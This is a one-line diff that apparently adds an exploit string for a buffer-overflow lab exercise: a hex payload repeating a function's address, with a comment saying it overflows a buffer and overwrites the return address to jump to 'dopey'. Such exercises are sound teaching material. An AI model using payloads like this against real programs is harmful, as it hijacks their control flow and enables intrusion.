@@ -1,0 +1,1 @@
+e1 91 04 08 e1 91 04 08 e1 91 04 08 e1 91 04 08 e1 91 04 08 e1 91 04 08 e1 91 04 08 e1 91 04 08 e1 91 04 08 e1 91 04 08 e1 91 04 08 e1 91 04 08 /* repeats adress of dopey until buffer is overloaded and the return address is overwritten with the address of dopey */
